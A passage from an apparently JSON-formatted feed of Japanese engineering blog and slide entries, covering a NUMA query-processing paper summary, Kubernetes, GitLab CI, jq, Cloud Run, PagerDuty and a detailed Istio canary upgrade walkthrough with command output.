Access)による順序通りではないメモリアクセスで実現する必要がある。これらの要因からplanベースの並列処理による不可分散とコンテキストスイッチとボトルネックが問題になりスケールが難しかった。NUMAによってデータとアクセススレッドがどのチップに配置されるかによって、データ項目のアクセスコストが異なるため、コンピュータ自体がネットワークになっており、多コア並列化では、RAMやキャッシュ階層を考慮する必要がある。この論文ではMoral-drivenクエリ実行フレームワークを提案している。手法提案手法は並列クエリ処理のため、morselドリブンクエリ評価フレームワークを提示した。これはメニーコア時代の分析クエリ性能の主要なボトルネックである負荷分散、スレッド同期、メモリアクセス局所性およびリソース弾力性を解決することを目的としている。ベースとなるアイデアは以下の2つに分けられる。メモリ上のデータをmorselと呼ばれる小さなバッチに分割し、バッチごとに処理を実行したあとにそれぞれの処理結果をグローバルハッシュテーブルとしてまとめる。Figure 3: NUMA-aware processing of the build-phaseディスパッチャと呼ばれる並行パイプライン制御を行ない、ワーカースレッドをタスクに割り当てるFigure 5: Dispatcher assigns pipeline-jobs on morsels to threads depending on the coreまとめとして著者はきめ細かいスケジューリング、完全演算子並列化、低オーバーヘッド同期、NUMA対応スケジューリングの原理を用いて、他のシステムでもメニーコアスケーリングを改善できると示唆している。作業時間read28:3628:36author32:453:09summary60:3727:52感想近現代のサーバアーキテクチャで主流になっているNUMAでのクエリパフォーマンス向上のための論文のため、古典的なものに比べ概念が難しいものが多い。もう少し理解を深めたい。","isoDate":"2023-04-18T01:01:35.000Z","dateMiliSeconds":1681779695000,"authorName":"NAKADATE Naoki","authorId":"nnaka2992"},{"title":"おうちk8sクラスターを構築していて詰まったところ","link":"https://kechigon.hatenablog.com/entry/2023/04/17/174444","contentSnippet":"おうち Kubernetes インターンを参考に機材調達->OSインストール->kubeadamでクラスター構築と一通りやってみたので、トラブったところと解決策を共有します。USBメモリRaspberry PiにOSをインストールする際に、SDカードの性能が悪いと失敗します。私は安物で済ませようとした結果、三枚目でようやく成功しました。またインストール後も、ディスクの読み書き速度は全体のパフォーマンスに影響を与えるので、性能にはこだわるべきです。以下のサイトなどを参考に選びましょう。https://www.kingston.com/jp/blog/personal-storage/memory-card-speed-classeshttps://osusumepc.com/raspberry-pi-microsd/cgroups の Memory Subsystem を有効化私がインストールしたOSでは、cgroups の Memory Subsystem がデフォルトで無効化されているため、/boot/firmware/cmdline.txtに下記を追加する必要がありました。cgroup_memory=1 cgroup_enable=memoryしかし、編集し再起動しても有効化されませんでした。原因は改行を入れて追加していたことでした。改行せず行末に追加するのが正しいです。","isoDate":"2023-04-17T08:44:44.000Z","dateMiliSeconds":1681721084000,"authorName":"Kurita Keigo","authorId":"kurita"},{"title":"コンテナイメージのマルウェア検出とその実用性について","link":"https://speakerdeck.com/kyohmizu/kontenaimezinomaruueajian-chu-tosonoshi-yong-xing-nituite","contentSnippet":"3-shake SRE Tech Talk #5 ~ コンテナセキュリティ最前線 の資料です。\\rhttps://3-shake.connpass.com/event/277945/","isoDate":"2023-04-12T04:00:00.000Z","dateMiliSeconds":1681272000000,"authorName":"kyohmizu","authorId":"kyohmizu"},{"title":"Kubernetes の Probe の仕組みと考慮点","link":"https://zenn.dev/toversus/articles/5d1292160f5035","contentSnippet":"!Kubernetes 1.26 時点の話で、以降のマイナーバージョンで改善されている可能性があります。Kubernetes には、ワークロードの正常性を確認するための Probe という仕組みがあり、Liveness / Readiness / Startup Probe が用意されています。kubelet (Kubernetes のノード上で動作するエージェント) は、ワークロードに対して TCP Socket / HTTP GET / gRPC / Exec の中から指定されたチェックを定期的に実行します。それぞれの Probe の特性を理解して使い分けないとサービスに影響...","isoDate":"2023-04-10T02:20:29.000Z","dateMiliSeconds":1681093229000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"GitLab CI で artifacts:reports:dotenv を使って Job をまたいで変数を渡す","link":"https://blog.1q77.com/2023/04/gitlab-ci-artifacts-report-dotenv/","contentSnippet":"GitLab CI である Job で変数を定義して、それを後続の Job でも使いたいなと思って調べていたらartifacts:reports:dotenv にたどり着いたのでメモ。使用例stages: - stage1 - stage2 - stage3 - stage4job1: stage: stage1 script: - echo \\"MY_VAR1=first-variable\\" >> dot.env artifacts: expire_in: 30 mins reports: dotenv: dot.env# job1 と job2 で使用するファイル名が重複しても別物なので問題ないjob2: stage: stage2 script: - echo \\"MY_VAR1=$MY_VAR1\\" - echo \\"MY_VAR2=second-variable\\" >> dot.env artifacts: expire_in: 30 mins reports: dotenv: dot.env needs: - job: job1 artifacts: true# needs で指定しているので MY_VAR1 も MY_VAR2 も渡されるjob3_1: stage: stage3 script: - echo \\"MY_VAR1=$MY_VAR1\\" - echo \\"MY_VAR2=$MY_VAR2\\" needs: - job: job1 artifacts: true - job: job2 artifacts: true# needs で job1 だけを指定しているので MY_VAR1 だけ渡されるjob3_2: stage: stage3 script: - echo \\"MY_VAR1=$MY_VAR1\\" - echo \\"MY_VAR2=$MY_VAR2\\" needs: - job: job1 artifacts: true# needs を指定しないと MY_VAR1 も MY_VAR2 も両方渡されるjob3_3: stage: stage3 script: - echo \\"MY_VAR1=$MY_VAR1\\" - echo \\"MY_VAR2=$MY_VAR2\\"# needs で job1 が指定されているが artifacts は false なので# MY_VAR1 も MY_VAR2 も渡されないjob3_4: stage: stage3 script: - echo \\"MY_VAR1=$MY_VAR1\\" - echo \\"MY_VAR2=$MY_VAR2\\" needs: - job: job1 artifacts: false# MY_VAR2 だけ受け取れるjob3_5: stage: stage3 script: - echo \\"MY_VAR1=$MY_VAR1\\" - echo \\"MY_VAR2=$MY_VAR2\\" needs: - job: job1 artifacts: false - job: job2 artifacts: truehttps://gitlab.com/gitlab-org/gitlab/-/issues/22638","isoDate":"2023-04-04T16:27:22.000Z","dateMiliSeconds":1680625642000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Orbstack を Docker Desktop の代わりに使う","link":"https://blog.1q77.com/2023/04/orbstack/","contentSnippet":"きっかけbrew update して新しく追加された formula を眺めるのが最近のちょっとした楽しみ— yteraoka (@yteraoka) January 12, 2023で、orbstack っていう formula が追加されてるのを見てほー、そんなものが、ということで試してみる。","isoDate":"2023-04-04T13:17:51.000Z","dateMiliSeconds":1680614271000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"kube-proxy の externalTrafficPolicy=Local の改善","link":"https://zenn.dev/toversus/articles/6eeb3b708bdff3","contentSnippet":"tl;dr;Service type LoadBalancer の externalTrafficPolicy: Local は、Kubernetes 1.26 まで Pod のローリング更新時にトラフィックが喪失する問題があるので注意kubernetes-sigs/cloud-provider-kind は、ローカル環境でクラウドリソース (現在は LB のみ) が絡む処理をシミュレートできて便利GKE Dataplane v2 を利用している場合、GKE 1.26.1 時点で Cilium に externalTrafficPolicy: Local の改善が入ってい...","isoDate":"2023-03-29T01:31:20.000Z","dateMiliSeconds":1680053480000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"PagerDuty で一定期間アラートを抑制する","link":"https://zenn.dev/toshikish/articles/6958af565e6c65","contentSnippet":"PagerDuty でアラートを受け取っているプロジェクトで，以下のようにある時間帯はアラートを止めたいケースがあります。メンテナンスが予定されている。開発環境は営業時間内だけ動かすので，平日夜や土日祝日は止めたい。何も対策しないとアラートが鳴ってしまい，オンコール担当者を不用意に呼び出す結果になるので，そうならないようにきちんと設定します。 TL;DR各ケースで以下のように設定します。メンテナンス→メンテナンスウィンドウを設定平日夜・土日停止→曜日・時刻ベースのイベントルールを追加 方法1：メンテナンスウィンドウメンテナンスなどでダウンする時間帯があらかじ...","isoDate":"2023-03-27T08:38:39.000Z","dateMiliSeconds":1679906319000,"authorName":"toshikish","authorId":"toshikish"},{"title":"jq commandの select でハマった話","link":"https://zenn.dev/satohjohn/articles/79faafa55e9a1e","contentSnippet":"結論配列のjsonに対してselectする際には、配列を一度オブジェクトの抽出をしないと複製されてしまう。なので、以下ではなくjq -r  \'select(.[].A | contains(\\"特定文字列\\")) | .[].B\' test.jsonこうしないといけないjq -r  \'.[] | select(.A | contains(\\"特定文字列\\")) | .B\' test.json 環境$ jq --version   jq-1.6 詰まった内容以下のjson(test.json)があったときにtest.json[    {        \\"hog...","isoDate":"2023-03-25T16:36:44.000Z","dateMiliSeconds":1679762204000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"Kubernetes と名前解決","link":"https://zenn.dev/toversus/articles/d9faba80f68ea2","contentSnippet":"tl;dr外部サービスのホスト名の末尾に . (ドット) を必ず指定しましょう。✅\xa0google.com.❌\xa0google.com末尾にドットを指定できない (e.g. SDK 組み込み) かつ大量の名前解決が発生している場合は、Pod の DNS Config の options で ndots: 1 を指定しましょう。Kubernetes の名前解決の仕組みを理解していないと、各ノードの conntrack テーブルが溢れてパケットが破棄され、サービスに影響が出ることがあります。 背景アプリケーションが外部のサービスを呼び出す場合、ホスト名を IP アド...","isoDate":"2023-03-22T07:36:38.000Z","dateMiliSeconds":1679470598000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"cloud runの要らなくなったリビジョンを消す","link":"https://zenn.dev/satohjohn/articles/2a769b8280427d","contentSnippet":"小ネタです。運用をしていて、たくさんリリースしているとリビジョンが増えていることとかもあるかなと思いますが、コンソール上から消すのも面倒なので、コマンドで消しましょう。というか、解説することもないので、結論と詰まった部分だけ残しておきます。 結論 ACTIVEじゃないものをすべて消す#!/bin/bashSERVICE_NAME=$1revisions=$(    gcloud run revisions list --service=$SERVICE_NAME \\\\    --filter=\\"status.conditions.type:Active AND s...","isoDate":"2023-03-21T02:35:43.000Z","dateMiliSeconds":1679366143000,"authorName":"SatohJohn","authorId":"SatohJohn"},{"title":"Datadog Agent からの Metrics を Victoria Metrics で受ける","link":"https://blog.1q77.com/2023/03/send-datadog-metrics-to-victoriametrics/","contentSnippet":"Victoria Metrics は v1.67.0 で Datadog Agent からのメトリクスを受け取れるようになっているので今回はこれを試してみる。Victoria Metrics のドキュメント How to send data from DataDog agentSingle node Instance をセットアップVictoria Metrics はクラスタリング構成も可能だが今回は Single node のサーバーで検証。","isoDate":"2023-03-19T12:38:04.000Z","dateMiliSeconds":1679229484000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"Azure Bicep で Storage Account の SSE を設定する","link":"https://zenn.dev/kyohei_saito/articles/fb102fd2af31e2","contentSnippet":"Azure Bicep で Storage Account の SSE (サーバー側暗号化) を設定してみようとしたところ、思ったより難しかったのと、やりたいことそのままのサンプルコードがなかったため、調査した内容を公開してみます。 この記事で書いてあることAzure Bicep を使用して Storage Account の SSE を設定する方法 サンプルコード早く使い方とコードを見たい、という方向けにまずはサンプル コードについて記載します。この記事で説明するサンプル コードの全体は下記を参照ください。https://github.com/kiyo-s/crea...","isoDate":"2023-03-19T04:44:58.000Z","dateMiliSeconds":1679201098000,"authorName":"Kyohei Saito","authorId":"kiyos"},{"title":"k8s.gcr.io の凍結対応から学んだことメモ","link":"https://zenn.dev/kyohei_saito/articles/d0080d94dae0b7","contentSnippet":"今まで Kubernetes プロジェクトのコンテナ イメージをホストしていたイメージ レジストリ k8s.gcr.io が凍結されることが発表されました。この記事では、k8s.gcr.io から registry.k8s.io に移行する過程で学んだことについて、備忘としてメモします。 この記事で書いてあることk8s.gcr.io から registry.k8s.io に移行した流れhelm で、dependencies によって外部の chart を install している場合に、外部の chart の values を設定する方法skopeo によりローカルで ...","isoDate":"2023-03-18T19:08:14.000Z","dateMiliSeconds":1679166494000,"authorName":"Kyohei Saito","authorId":"kiyos"},{"title":"[Terraform] aws_networkfirewall_firewall リソースから VPC エンドポイント ID を取り出す","link":"https://zenn.dev/toshikish/articles/fc08c2021811f9","contentSnippet":"はじめにTerraform を使って AWS Network Firewall のファイアウォールを作るとき，生成された VPC エンドポイントの ID をサブネットのルートテーブルのルートに追加するのは自然な流れですが，VPC エンドポイント ID を取り出すのが大変だったので，やり方を記録しておきます。例えば以下のように aws_networkfirewall_firewall リソースを定義したとします。（特に説明のない変数やリソースは，なんとなくの理解で構いません。）resource \\"aws_networkfirewall_firewall\\" \\"firewall\\" ...","isoDate":"2023-03-16T07:58:23.000Z","dateMiliSeconds":1678953503000,"authorName":"toshikish","authorId":"toshikish"},{"title":"振り返り (2020 - 2022)","link":"https://zenn.dev/toversus/articles/8557a7fb2bc15c","contentSnippet":"コロプラに 2020/3/1 に入社して、2023/2/28 付けで退職したので、丸々 3 年間勤務したことになります。本当の意味での大規模 Kubernetes 環境で貴重な経験をさせて貰い感謝しかないです。記憶が新しい内に、この 3 年間でやってきたことを公開できる範囲で整理しました。 GitOps 風なマニフェスト管理への移行インフラチームで管理している監視ツールやアドオンなコンポーネントを Helm でインストールしていました。マルチクラスタな環境で手動インストールはスケールしないので、Helmfile で生成した各クラスタのマニフェストを Argo CD で同期する方式に...","isoDate":"2023-03-05T14:17:49.000Z","dateMiliSeconds":1678025869000,"authorName":"Tsubasa Nagasawa","authorId":"toVersus"},{"title":"放送コンテンツに対する ツイートの＜一様率＞分析","link":"https://speakerdeck.com/ota1022/fang-song-kontentunidui-suru-tuitono-yang-lu-fen-xi","contentSnippet":"DEIM2023 Day1 4a-3-2にて発表したスライドです。\\rhttps://event.dbsj.org/deim2023/","isoDate":"2023-03-05T05:00:00.000Z","dateMiliSeconds":1677992400000,"authorName":"Itaru Ota","authorId":"iota"},{"title":"Devbox を使った開発環境","link":"https://blog.1q77.com/2023/03/devbox/","contentSnippet":"ローカル環境を汚さずDockerコンテナのオーバーヘッドもなく、開発環境を自在に構築できる「Devbox 0.2.0」登場 － Publickeyこの記事を最初に見たときは「えーそんなのコンテナじゃないじゃん」とか思って不要じゃね？って思ってたんですが、Rails を少し触ることになって macOS 上での docker の遅さに辟易してきたので devbox を思い出し、使ってみることにしました。","isoDate":"2023-03-04T15:05:12.000Z","dateMiliSeconds":1677942312000,"authorName":"yteraoka","authorId":"yteraoka"},{"title":"ChatGPTのアルゴリズム","link":"https://speakerdeck.com/yunosukey/chatgptnoarukorisumu","contentSnippet":"ニューラルネット系自然言語処理の歴史を、アルゴリズムも紹介しながら単純パーセプトロンからChatGPTに至るまで辿る","isoDate":"2023-03-03T05:00:00.000Z","dateMiliSeconds":1677819600000,"authorName":"Yunosuke Yamada","authorId":"yyamada"},{"title":"【Istio⛵️】Istioを安全にアップグレードするカナリア方式とその仕組み","link":"https://hiroki-hasegawa.hatenablog.jp/entry/2023/02/26/202548","contentSnippet":"この記事から得られる知識この記事を読むと、以下を \\"完全に理解\\" できます✌️Istioのアップグレード手法の種類について安全なカナリア方式の仕組みについてこの記事から得られる知識01. はじめに02. なぜ安全なアップグレードが必要なのか起こりうる問題採用するべきアップグレード手法03. アップグレード手法を説明する前にカナリアリリースとはカナリアリリースの手順(1) 新環境のリリース(2) 新環境への重み付けルーティング(3) 実地的テストの実施(4) 重み付けの段階的変更『カナリアリリース』の呼称の由来04. アップグレード手法の概要(1) アップグレード前の検証(2) 新Istiodのインストール(3) Webhookの宛先のServiceの変更(4) Istio IngressGatewayをインプレースアップグレード(5) 一部のNamespaceのistio-proxyコンテナをアップグレード(6) ユーザの手を借りたテスト(7) istio-proxyコンテナの段階的アップグレード(8) 旧Istiodのアンインストール05. アップグレード手法の詳細istioctl コマンドを使用したアップグレード前提NamespaceIstiodIstio IngressGatewayマイクロサービス(1) アップグレード前の検証ここで実施することistioctl x precheckコマンドkubectl getコマンド▼ IstiodのDeployment▼ Webhookの宛先のService▼ 宛先のServiceを決めるMutatingWebhookConfiguration(2) 新Istiodのインストールここで実施することistioctl versionコマンドistioctl installコマンドkubectl getコマンド▼ IstiodのDeployment▼ Webhookの宛先のService▼ Webhookの宛先のServiceを決めるMutatingWebhookConfiguration(3) Webhookの宛先のServiceの変更ここで実施することistioctl tag setコマンド(4) Istio IngressGatewayをインプレースアップグレードここで実施することkubectl rollout restartコマンド(5) 一部のNamespaceのistio-proxyコンテナをアップグレードここで実施することkubectl rollout restartコマンド(6) ユーザの手を借りたテストここで実施することもし問題が起こった場合(7) istio-proxyコンテナの段階的アップグレードここで実施することkubectl rollout restartコマンド(8) 旧Istiodのアンインストールここで実施することistioctl uninstallコマンドkubectl getコマンド▼ IstiodのDeployment▼ Webhookの宛先のService▼ 宛先のServiceを決めるMutatingWebhookConfiguration06. おわりに記事関連のおすすめ書籍01. はじめに隠しません。有吉弘行のサンデーナイトドリーマー は人生のバイブルです。さて、最近の業務でIstio⛵️をひたすらアップグレードしています。今回は、採用したアップグレード手法の紹介も兼ねて、Istioの安全なアップグレード手法の仕組みを記事で解説しました。Istioのアップグレード手法には変遷があり、解説するのは執筆時点 (2023/02/26) で最新の 1.14 系のアップグレード手法です。それでは、もりもり布教していきます\uD83D\uDE1702. なぜ安全なアップグレードが必要なのか起こりうる問題そもそも、なぜIstioで安全なアップグレードを採用する必要があるのでしょうか。Istioで問題が起こると、Pod内のistio-proxyコンテナが正しく稼働せず、システムに大きな影響を与える可能性があります。例えば、istio-proxyコンテナのPodへのインジェクションがずっと完了せず、アプリコンテナへの通信が全て遮断されるといったことが起こることがあります。採用するべきアップグレード手法執筆時点 (2023/02/26) では、Istiodコントロールプレーン (以降、Istiodとします) のアップグレード手法には、『インプレース方式』と『カナリア方式』があります。また合わせてアップグレードが必要なIstio IngressGatewayには、その手法に『インプレース方式』があります。今回の安全なアップグレード手法として、Istiodでは『カナリアアップグレード』、Istio IngressGatewayでは『インプレースアップグレード』を採用します。Istio / Canary UpgradesIstio / Installing Gateways03. アップグレード手法を説明する前にカナリアリリースとはIstiodのカナリアアップグレードが理解しやすくなるように、カナリアリリースから説明したいと思います。カナリアリリースは、実際のユーザーにテストしてもらいながらリリースする手法です。もしカナリアリリースをご存知の方は、 04. アップグレード手法の概要 まで飛ばしてください\uD83D\uDE47\uD83C\uDFFB‍カナリアリリースの手順カナリアリリースは、一部のユーザーを犠牲にすることになる一方で、アプリを実地的にテストできる点で優れています。手順を交えながら説明します。Canary Release(1) 新環境のリリース旧環境のアプリを残したまま、新環境をリリースします。この段階では、全てのユーザー (100%) を旧環境にルーティングします。(2) 新環境への重み付けルーティングロードバランサーで重み付けを変更し、一部のユーザー (ここでは10%) を新環境にルーティングします。(3) 実地的テストの実施ユーザーの手を借りて新環境を実地的にテストします (例：該当のエラーメトリクスが基準値を満たすか) 。(4) 重み付けの段階的変更新環境に問題が起こらなければ、重み付けを段階的に変更し、最終的には全てのユーザー (100%) を新環境にルーティングします。『カナリアリリース』の呼称の由来カナリアリリースについては、その呼称の由来を知ると、より理解が深まります。カナリアリリースは、20世紀頃の炭坑労働者の危機察知方法に由来します。炭鉱内には有毒な一酸化炭素が発生する場所がありますが、これは無色無臭なため、気づくことに遅れる可能性があります。そこで当時の炭鉱労働者は、一酸化炭素に敏感な『カナリア』を炭鉱内に持ち込み、カナリアの様子から一酸化炭素の存在を察知するようにしていたそうです。つまり、先ほどの『犠牲になる一部のユーザー』が、ここでいうカナリアというわけです\uD83D\uDE28画像引用元：George McCaa, U.S. Bureau of MinesAbout canary deployment in simple words04. アップグレード手法の概要カナリアリリースを理解したところで、Istioの安全なアップグレード手法の概要を説明します。おおよそ以下の手順からなります。なお各番号は、05. アップグレード手法の詳細 の (1) 〜 (8) に対応しています。(1) アップグレード前の検証旧Istiodが稼働しています。ここで、アップグレードが可能かどうかを検証しておきます。(2) 新Istiodのインストール新Istiod (discoveryコンテナ) をインストールします。(3) Webhookの宛先のServiceの変更新Istiodのistio-proxyコンテナをインジェクションできるように、Webhookの宛先のServiceを変更します。この手順は重要で、後の  (3) Webhookの宛先のServiceの変更 で詳細を説明しています。(4) Istio IngressGatewayをインプレースアップグレードIstio IngressGatewayをインプレースアップグレードします。(5) 一部のNamespaceのistio-proxyコンテナをアップグレード一部のNamespaceで、istio-proxyコンテナをカナリアアップグレードします。▶︎ 『カナリアアップグレード』の呼称についてistio-proxyコンテナを一斉にアップグレードするのではなく、段階的にアップグレードしていく様子を『カナリア』と呼称している、と個人的に推測しています。もし『カナリアアップグレード』の由来をご存じの方は、ぜひ教えていただけると\uD83D\uDE47\uD83C\uDFFB‍(6) ユーザの手を借りたテストユーザーの手を借りて、実地的にテストします (例：該当のエラーメトリクスが基準値以下を満たすか) 。(7) istio-proxyコンテナの段階的アップグレード新Istiodのistio-proxyコンテナに問題が起こらなければ、他のNamespaceでもistio-proxyコンテナを段階的にカナリアアップグレードしていきます。一方でもし問題が起これば、Namespaceのistio-proxyコンテナとIstio IngressGatewayをダウングレードします。(8) 旧Istiodのアンインストール最後に、旧Istiodをアンインストールします。Istio / Canary Upgrades05. アップグレード手法の詳細istioctl コマンドを使用したアップグレードここからは、04. アップグレード手法の概要 を深ぼっていきます。今回は、ドキュメントで一番優先して記載されている istioctl コマンドを使用した手順 を説明します。なお各番号は、04. アップグレード手法の概要 の (1) 〜 (8) に対応しています。▶︎ アップグレードに使用するツールについてistioctlコマンド以外のツール (例：helmコマンド、helmfileコマンド、ArgoCD) を使用してもアップグレードできます。細かな手順が異なるだけで、アップグレード手法の概要は同じです\uD83D\uDE46\uD83C\uDFFB‍前提Namespaceまず最初に、前提となる状況を設定しておきます。各Namespaceのistio.io/revラベルにdefaultが設定されているとします。$ kubectl get namespace -L istio.io/revNAME              STATUS   AGE   REVfoo               Active   34d   defaultbar               Active   34d   defaultbaz               Active   34d   defaultistio-ingress     Active   34d   default...▶︎ istio.io/revラベル値のエイリアスについてistio.io/revラベル値は、どんなエイリアスでもよいです。よくあるエイリアスとしてdefaultやstableを使用します\uD83D\uDC4Dさらに、マニフェストに書き起こすと以下のようになっています。apiVersion: v1kind: Namespacemetadata:  name: foo  labels:    istio.io/rev: defaultこのistio.io/revラベルがあることにより、そのNamespaceのPodにistio-proxyコンテナを自動的にインジェクションします。▶︎ istio-proxyコンテナのインジェクションの仕組みについてについてistio-proxyコンテナのインジェクションの仕組みについては、今回言及しておりません。以下の記事で解説していますため、もし気になる方はよろしくどうぞ\uD83D\uDE47\uD83C\uDFFB‍Istiodすでに1-14-6のIstiodが動いており、1-15-4にカナリアアップグレードします。IstiodはDeployment配下のPodであり、このPodはIstiodの実体であるdiscoveryコンテナを持ちます。$ kubectl get deployment -n istio-system -l app=istiodNAME                   READY   UP-TO-DATE   AVAILABLE   AGEistiod-1-14-6          1/1     1            1           47s # 1-14-6Istio IngressGatewayIstio IngressGatewayはIstiodとは異なるNamespaceで動いており、インプレースアップグレードします。Istio IngressGatewayはistio-proxyコンテナを持ちます。$ kubectl get deployment -n istio-ingressNAME                   READY   UP-TO-DATE   AVAILABLE   AGEistio-ingressgateway   1/1     1            1           47s▶︎ IstiodとIstio IngressGatewayを動かすNamespaceについてIstio / Installing Gatewaysマイクロサービス各Namespaceでマイクロサービスが動いています。マイクロサービスのPodはistio-proxyコンテナを持ちます。$ kubectl get deployment -n fooNAME   READY   UP-TO-DATE   AVAILABLE   AGEfoo    2/2     1            1           47s...$ kubectl get deployment -n barNAME   READY   UP-TO-DATE   AVAILABLE   AGEbar    2/2     1            1           47s..$ kubectl get deployment -n bazNAME   READY   UP-TO-DATE   AVAILABLE   AGEbaz    2/2     1            1           47s...(1) アップグレード前の検証ここで実施することアップグレード前に、現在のKubernetes Clusterがアップグレード要件を満たしているかを検証します。Before you upgradeistioctl x precheckコマンドistioctl x precheckコマンドを実行し、アップグレード要件を検証します。問題がなければ、istioctlコマンドはNo issue ...の文言を出力します。$ istioctl x precheck✅ No issues found when checking the cluster.Istiois safe to install or upgrade!  To get started, check out https://istio.io/latest/docs/setup/getting-started/▶︎ アップグレード要件が満たない場合についてistioctl x precheckコマンドはエラー文言を出力します。例えば、Istioのistio-proxyコンテナのインジェクションではkube-apiserverと通信する必要があります。そのため、kube-apiserverのバージョンが古すぎるせいでIstioが非対応であると、エラーになります\uD83D\uDE2Dkubectl getコマンド▼ IstiodのDeploymentkubectl getコマンドを実行し、現在のIstiodのバージョンを確認します\uD83D\uDC40まずはIstiodのDeploymentを確認すると、1-14-6のDeploymentがあります。$ kubectl get deployment -n istio-system -l app=istiodNAME                   READY   UP-TO-DATE   AVAILABLE   AGEistiod-1-14-6          1/1     1            1           47s # 1-14-6istio-proxyコンテナのインジェクションの仕組みでいうと、以下の赤枠の要素です\uD83D\uDC47▼ Webhookの宛先のService次に、 Serviceを確認すると、1-14-6のServiceがあります。$ kubectl get service -n istio-system -l app=istiodNAME            TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)                                 AGEistiod-1-14-6   ClusterIP   10.96.93.151     <none>        15010/TCP,15012/TCP,443/TCP,15014/TCP   109s # 1-14-6このServiceは、kube-apiserverからIstiodへのWebhookを仲介することにより、istio-proxyコンテナのインジェクションを可能にします。istio-proxyコンテナのインジェクションの仕組みでいうと、以下の赤枠の要素です\uD83D\uDC47▼ 宛先のServiceを決めるMutatingWebhookConfiguration最後に、MutatingWebhookConfigurationを確認すると、istio-revision-tag-<エイリアス>とistio-sidecar-injector-<リビジョン番号>のMutatingWebhookConfigurationがあります。$ kubectl get mutatingwebhookconfigurationsNAME                            WEBHOOKS   AGEistio-revision-tag-default      2          114s  # カナリアアップグレード用istio-sidecar-injector-1-14-6   2          2m16s # インプレースアップグレード用のため今回は言及しないistio-proxyコンテナのインジェクションの仕組みでいうと、以下の赤枠の要素です\uD83D\uDC47これらのうち、前者 (istio-revision-tag-<エイリアス>) をカナリアアップグレードのために使用します。このMutatingWebhookConfigurationは、Webhookの宛先のServiceを決めるため、結果的にistio-proxyコンテナのバージョンを決めます。ここで、MutatingWebhookConfigurationのistio.io/revラベルとistio.io/tagラベルの値も確認しておきます。$ kubectl get mutatingwebhookconfiguration istio-revision-tag-default -o yaml \\\\    | yq \'.metadata.labels\'...istio.io/rev: 1-14-6istio.io/tag: default...istio.io/revラベルはIstiodのバージョン、istio.io/tagラベルはこれのエイリアスを表しています。また、.webhooks[].namespaceSelectorキー配下のistio.io/revキーの検知ルールを確認します。$ kubectl get mutatingwebhookconfiguration istio-revision-tag-default -o yaml \\\\    | yq \'.webhooks[]\'...namespaceSelector:  matchExpressions:    - key: istio.io/rev      operator: In      values:        - default...合わせて、.webhooks[].clientConfig.serviceキー配下のServiceを名前を確認します。$ kubectl get mutatingwebhookconfiguration istio-revision-tag-default -o yaml \\\\    | yq \'.webhooks[].clientConfig\'...service:  name: istiod-1-14-6...▶︎ MutatingWebhookConfigurationの役割についてistio.io/revラベルにdefaultを設定してあるとします。すると、上記のMutatingWebhookConfigurationがこれを検知します。MutatingWebhookConfigurationにはdefaultに対応するIstioのリビジョンが定義されており、kube-apiserverが特定のIstioのバージョンのServiceにWebhookを送信可能になります\uD83C\uDF89Istio / Safely upgrade the Istio control plane with revisions and tags(2) 新Istiodのインストールここで実施することそれでは、新Istiodをインストールします。Control planeistioctl versionコマンド新しくインストールするIstiodのバージョンは、istioctlコマンドのバージョンで決まります。そこで、istioctl versionコマンドを実行し、これのバージョンを確認します。$ istioctl versionclient version: 1.15.4        # アップグレード先のバージョンcontrol plane version: 1.14.6 # 現在のバージョンdata plane version: 1.14.6istioctl installコマンドカナリアアップグレードの場合、istioctl installコマンドを実行します。ドキュメントではrevisionキーの値がcanaryですが、今回は1-15-4とします。この値は、Istioが使用する様々なKubernetesリソースの接尾辞や、各リソースのistio.io/revラベルの値になります。$ istioctl install --set revision=1-15-4WARNING: Istio is being upgraded from 1.14.6 -> 1.15.4WARNING: Before upgrading, you may wish to use \'istioctl analyze\' to check for IST0002 and IST0135 deprecation warnings.✅ Istio core installed✅ Istiod installed✅ Ingress gateways installed✅ Installation completeThank you for installing Istio 1.15.  Please take a few minutes to tell us about your install/upgrade experience!▶︎ カナリアアップグレードで指定できるバージョン差についてrevisionキーを使用したカナリアアップグレードでは、2つの先のマイナーバージョンまでアップグレードできます。例えば、現在のIstioが1.14.6であるなら、1.16系まで対応しています\uD83D\uDC4DIstio / Canary Upgradeskubectl getコマンド▼ IstiodのDeploymentkubectl getコマンドを実行し、istioctl installコマンドで何をインストールしたのかを確認します\uD83D\uDC40まずはIstiodのDeploymentを確認すると、1-15-4というDeploymentが新しく増えています。$ kubectl get deployment -n istio-system -l app=istiodNAME            READY   UP-TO-DATE   AVAILABLE   AGEistiod-1-14-6   1/1     1            1           47s # 1-14-6istiod-1-15-4   1/1     1            1           47s # 1-15-4接尾辞の1-15-4は、revisionキーの値で決まります。この段階では、旧Istiodと新Istioが並行的に稼働しており、kube-apiserverはまだ旧Istiodと通信しています今の状況は以下の通りです\uD83D\uDC47▼ Webhookの宛先のService次に Webhookの宛先のServiceを確認すると、istiod-1-15-4というServiceが新しく増えています。$ kubectl get service -n istio-system -l app=istiodNAME            TYPE        CLUSTER-IP       EXTERNAL-IP   PORT(S)                                 AGEistiod-1-14-6   ClusterIP   10.96.93.151     <none>        15010/TCP,15012/TCP,443/TCP,15014/TCP   109s # 1-14-6istiod-1-15-4   ClusterIP   10.104.186.250   <none>        15010/TCP,15012/TCP,443/TCP,15014/TCP   87s  # 1-15-4この段階では、まだWebhookの宛先はistiod-1-14-6のServiceです。今の状況は以下の通りです\uD83D\uDC47▼ Webhookの宛先のServiceを決めるMutatingWebhookConfiguration最後にMutatingWebhookConfigurationを確認すると、istio-sidecar-injector-1-15-4というMutatingWebhookConfigurationが新しく増えています。$ kubectl get mutatingwebhookconfigurationsNAME                            WEBHOOKS   AGEistio-revision-tag-default      2          114s  # カナリアアップグレードで使用するistio-sidecar-injector-1-14-6   2          2m16sistio-sidecar-injector-1-15-4   2          2m16sカナリアアップグレードでは、istio-revision-tag-<エイリアス>のMutatingWebhookConfigurationを使用します。今の状況は以下の通りです\uD83D\uDC47▶︎ アンインストールについて(3) Webhookの宛先のServiceの変更ここで実施することこの手順では、エイリアスのistio.io/tagラベルの値はそのままにしておき、一方でistio.io/revラベルの値を変更します。さらに、Webhookの宛先のServiceを変更します。Default tagSafely upgrade the Istio control plane with 